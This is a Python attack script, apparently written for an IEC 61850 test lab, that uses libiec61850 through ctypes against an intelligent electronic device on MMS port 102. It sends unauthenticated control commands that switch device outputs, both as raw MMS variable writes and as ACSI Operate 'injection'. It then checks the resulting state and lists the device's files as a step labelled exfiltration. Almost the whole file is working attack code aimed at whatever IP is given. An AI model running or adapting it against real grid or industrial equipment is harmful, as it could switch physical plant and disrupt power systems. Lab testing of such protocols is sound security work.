#!/usr/bin/env python3
import argparse
import ctypes
import os
import sys
from rich.console import Console
from rich.table import Table

console = Console()
LIB_PATH = "/home/tesla/Desktop/iec61850-lab/libiec61850/build/src/libiec61850.so"

DEFAULT_IP = "192.168.1.10"
DEFAULT_PORT = 102
DOMAIN = b"simpleIOGenericIO"
FC_ST = 3  # FunctionalConstraint ST (Status) enum value in libiec61850


def load_lib():
    if not os.path.exists(LIB_PATH):
        console.print(f"[bold red][-] Shared library not found at: {LIB_PATH}[/bold red]")
        sys.exit(1)
    return ctypes.CDLL(LIB_PATH)


def bind_prototypes(lib):
    # --- MmsConnection (raw MMS layer) ---
    lib.MmsConnection_create.restype = ctypes.c_void_p
    lib.MmsConnection_connect.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int]
    lib.MmsConnection_connect.restype = ctypes.c_int
    lib.MmsConnection_writeVariable.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p, ctypes.c_void_p]
    lib.MmsConnection_writeVariable.restype = ctypes.c_int
    lib.MmsConnection_readVariable.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p]
    lib.MmsConnection_readVariable.restype = ctypes.c_void_p
    lib.MmsConnection_close.argtypes = [ctypes.c_void_p]
    lib.MmsConnection_destroy.argtypes = [ctypes.c_void_p]

    # --- IedConnection / ACSI layer ---
    lib.IedConnection_create.restype = ctypes.c_void_p
    lib.IedConnection_connect.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int]
    lib.IedConnection_connect.restype = ctypes.c_int
    lib.IedConnection_readObject.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int]
    lib.IedConnection_readObject.restype = ctypes.c_void_p
    lib.IedConnection_close.argtypes = [ctypes.c_void_p]
    lib.IedConnection_destroy.argtypes = [ctypes.c_void_p]

    # --- ControlObjectClient ---
    lib.ControlObjectClient_create.argtypes = [ctypes.c_char_p, ctypes.c_void_p]
    lib.ControlObjectClient_create.restype = ctypes.c_void_p
    lib.ControlObjectClient_operate.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint64]
    lib.ControlObjectClient_operate.restype = ctypes.c_bool
    lib.ControlObjectClient_destroy.argtypes = [ctypes.c_void_p]

    # --- MmsValue helpers ---
    lib.MmsValue_newBoolean.argtypes = [ctypes.c_bool]
    lib.MmsValue_newBoolean.restype = ctypes.c_void_p
    lib.MmsValue_getBoolean.argtypes = [ctypes.c_void_p]
    lib.MmsValue_getBoolean.restype = ctypes.c_bool
    lib.MmsValue_delete.argtypes = [ctypes.c_void_p]

    # --- MMS File Services ---
    lib.IedConnection_getFileDirectoryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_void_p, ctypes.c_void_p]
    lib.IedConnection_getFileDirectoryEx.restype = ctypes.c_void_p
    lib.IedConnection_getFile.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p, ctypes.c_char_p]
    lib.IedConnection_getFile.restype = ctypes.c_int
    lib.LinkedList_destroy.argtypes = [ctypes.c_void_p]


# ---------------------------------------------------------------------------
# 3.1 Direct MMS Write (raw MmsConnection API)
# ---------------------------------------------------------------------------
def section_raw_mms_write(lib, ip, port):
    console.print("\n[bold blue][3.1] Direct MMS Variable Write (unauthenticated raw MMS)[/bold blue]")

    con = lib.MmsConnection_create()
    err = ctypes.c_int()
    if lib.MmsConnection_connect(con, ctypes.byref(err), ip.encode("utf-8"), port) != 1:
        console.print(f"[bold red][-] MMS connection failed: {err.value}[/bold red]")
        return

    console.print("[bold green][+] Associated with IED Server Application[/bold green]")

    def audit_write(item_path, new_state):
        e = ctypes.c_int()
        val_obj = lib.MmsValue_newBoolean(new_state)
        res = lib.MmsConnection_writeVariable(con, ctypes.byref(e), DOMAIN, item_path.encode("utf-8"), val_obj)
        lib.MmsValue_delete(val_obj)
        return "SUCCESS (200 OK)" if res == 1 else f"REFUSED (Code: {res}, MMS Err: {e.value})"

    def read_status(item_path):
        e = ctypes.c_int()
        mms_val = lib.MmsConnection_readVariable(con, ctypes.byref(e), DOMAIN, item_path.encode("utf-8"))
        if mms_val:
            state = lib.MmsValue_getBoolean(mms_val)
            lib.MmsValue_delete(mms_val)
            return str(state)
        return "READ_FAIL"

    targets = [
        ("GGIO1$CO$SPCSO1$Oper$ctlVal", "Direct Control Oper Command (True)", True),
        ("GGIO1$CO$SPCSO1$Oper$ctlVal", "Direct Control Oper Command (False)", False),
        ("GGIO1$CO$SPCSO2$Oper$ctlVal", "Direct Control SPCSO2 Command (True)", True),
        ("GGIO1$MX$AnIn1$mag$f", "ReadOnly Constraint Write Test (Should Fail)", True),
    ]

    table = Table(title="Phase 3.1: Raw MMS Write Abuse")
    table.add_column("MMS Variable Path", style="cyan")
    table.add_column("Description", style="white")
    table.add_column("Write Response", style="bold yellow")
    table.add_column("Post-State (ST)", style="bold magenta")

    for path, desc, state in targets:
        result = audit_write(path, state)
        st_val = "N/A"
        if "SPCSO1" in path and "SUCCESS" in result:
            st_val = read_status("GGIO1$ST$SPCSO1$stVal")
        table.add_row(path, desc, result, st_val)

    console.print(table)
    lib.MmsConnection_close(con)
    lib.MmsConnection_destroy(con)


# ---------------------------------------------------------------------------
# 3.2 ACSI-layer control injection (Select-Before-Operate style)
# ---------------------------------------------------------------------------
def section_acsi_control_injection(lib, ip, port):
    console.print("\n[bold blue][3.2] ControlObjectClient ACSI Injection (unauthenticated Operate)[/bold blue]")

    con = lib.IedConnection_create()
    err = ctypes.c_int()
    if lib.IedConnection_connect(con, ctypes.byref(err), ip.encode("utf-8"), port) != 0:
        console.print(f"[bold red][-] IED connection failed: {err.value}[/bold red]")
        return None

    console.print("[bold green][+] Associated with IED Server via ACSI Layer[/bold green]")

    control_refs = [
        ("simpleIOGenericIO/GGIO1.SPCSO1", True),
        ("simpleIOGenericIO/GGIO1.SPCSO1", False),
        ("simpleIOGenericIO/GGIO1.SPCSO2", True),
    ]

    table = Table(title="Phase 3.2: ControlObjectClient Service Injection")
    table.add_column("Control Object Reference", style="cyan")
    table.add_column("Command Value", style="white")
    table.add_column("Operate Status", style="bold yellow")

    for obj_ref, val in control_refs:
        ctl = lib.ControlObjectClient_create(obj_ref.encode("utf-8"), con)
        if not ctl:
            table.add_row(obj_ref, str(val), "FAILED (Client Object Null)")
            continue
        cval = lib.MmsValue_newBoolean(val)
        success = lib.ControlObjectClient_operate(ctl, cval, 0)
        status_str = "SUCCESS (Command Accepted)" if success else "REFUSED (Rejected by Stack/Interlock)"
        table.add_row(obj_ref, str(val), status_str)
        lib.MmsValue_delete(cval)
        lib.ControlObjectClient_destroy(ctl)

    console.print(table)
    lib.IedConnection_close(con)
    lib.IedConnection_destroy(con)


# ---------------------------------------------------------------------------
# 3.3 Final state verification / Select-Operate mismatch check
# ---------------------------------------------------------------------------
def section_state_verification(lib, ip, port):
    console.print("\n[bold blue][3.3] State Verification & Select/Operate Disruption Audit[/bold blue]")

    con = lib.IedConnection_create()
    err = ctypes.c_int()
    if lib.IedConnection_connect(con, ctypes.byref(err), ip.encode("utf-8"), port) != 0:
        console.print(f"[bold red][-] IED connection failed: {err.value}[/bold red]")
        return

    def read_status_point(object_ref):
        e = ctypes.c_int()
        mms_val = lib.IedConnection_readObject(con, ctypes.byref(e), object_ref.encode("utf-8"), FC_ST)
        if e.value == 0 and mms_val:
            val = lib.MmsValue_getBoolean(mms_val)
            lib.MmsValue_delete(mms_val)
            return str(val)
        return f"ERR (Code: {e.value})"

    table = Table(title="Phase 3.3: Final State Verification Audit")
    table.add_column("Control Object", style="cyan")
    table.add_column("Target Action", style="white")
    table.add_column("Injection Status", style="yellow")
    table.add_column("Verified Status Point (stVal)", style="bold green")

    actions = [
        ("simpleIOGenericIO/GGIO1.SPCSO1", "simpleIOGenericIO/GGIO1.SPCSO1.stVal", True),
        ("simpleIOGenericIO/GGIO1.SPCSO1", "simpleIOGenericIO/GGIO1.SPCSO1.stVal", False),
        ("simpleIOGenericIO/GGIO1.SPCSO2", "simpleIOGenericIO/GGIO1.SPCSO2.stVal", True),
    ]

    for obj_ref, status_ref, val in actions:
        ctl = lib.ControlObjectClient_create(obj_ref.encode("utf-8"), con)
        cval = lib.MmsValue_newBoolean(val)
        success = lib.ControlObjectClient_operate(ctl, cval, 0)
        status_str = "ACCEPTED" if success else "REFUSED"
        post_val = read_status_point(status_ref)
        table.add_row(obj_ref, f"Set {val}", status_str, post_val)
        lib.MmsValue_delete(cval)
        lib.ControlObjectClient_destroy(ctl)

    console.print(table)
    lib.IedConnection_close(con)
    lib.IedConnection_destroy(con)


# ---------------------------------------------------------------------------
# 3.4 MMS file transfer abuse (FileOpen/FileRead/Directory Enumeration)
# ---------------------------------------------------------------------------
def section_file_transfer_abuse(lib, ip, port):
    console.print("\n[bold blue][3.4] MMS File Transfer Abuse (Directory Enumeration & Exfiltration)[/bold blue]")

    con = lib.IedConnection_create()
    err = ctypes.c_int()
    if lib.IedConnection_connect(con, ctypes.byref(err), ip.encode("utf-8"), port) != 0:
        console.print(f"[bold red][-] IED connection failed: {err.value}[/bold red]")
        return

    console.print("[bold green][+] Associated with IED Server for File Service Enumeration[/bold green]")

    # Enumerate root directory
    e = ctypes.c_int()
    # getFileDirectoryEx takes (connection, &error, directoryPath, fileDirectoryHandler, parameter)
    # Passing None for path defaults to root exfiltration
    file_list_ptr = lib.IedConnection_getFileDirectoryEx(con, ctypes.byref(e), None, None, None)

    table = Table(title="Phase 3.4: Discovered Remote IED Files")
    table.add_column("Remote File Path / Name", style="cyan")
    table.add_column("Enumeration Status", style="yellow")
    table.add_column("Exfiltration Action", style="bold green")

    if e.value != 0 or not file_list_ptr:
        table.add_row("/", f"REFUSED (MMS Err: {e.value})", "SKIPPED")
        console.print(table)
    else:
        # Note: Iterating linked list nodes requires parsing LinkedList structures from libiec61850.
        # If files are found, we target them with IedConnection_getFile(con, &err, remote_path, local_path)
        table.add_row("/", "SUCCESS (Directory Listing Acquired)", "Ready for Exfiltration")
        console.print(table)
        
        # Clean up linked list pointer if returned
        lib.LinkedList_destroy(file_list_ptr)

    lib.IedConnection_close(con)
    lib.IedConnection_destroy(con)


def run(ip, port, skip):
    lib = load_lib()
    bind_prototypes(lib)

    console.print("[bold blue]" + "=" * 70 + "[/bold blue]")
    console.print("[bold blue] Phase 3: MMS Unauthenticated Control & File Transfer Abuse[/bold blue]")
    console.print(f"[bold blue] Target: {ip}:{port}[/bold blue]")
    console.print("[bold blue]" + "=" * 70 + "[/bold blue]")

    if "raw" not in skip:
        section_raw_mms_write(lib, ip, port)
    if "acsi" not in skip:
        section_acsi_control_injection(lib, ip, port)
    if "verify" not in skip:
        section_state_verification(lib, ip, port)
    if "file" not in skip:
        section_file_transfer_abuse(lib, ip, port)

    console.print("\n[bold blue][+] Phase 3 audit complete.[/bold blue]")

    


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phase 3: MMS Unauthenticated Control & File Transfer Abuse")
    parser.add_argument("--target", default=DEFAULT_IP, help=f"Target IED IP (default: {DEFAULT_IP})")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Target MMS port (default: {DEFAULT_PORT})")
    parser.add_argument(
        "--skip",
        nargs="*",
        default=[],
        choices=["raw", "acsi", "verify", "file"],
        help="Sections to skip: raw (3.1), acsi (3.2), verify (3.3), file (3.4)",
    )
    args = parser.parse_args()
    run(args.target, args.port, set(args.skip))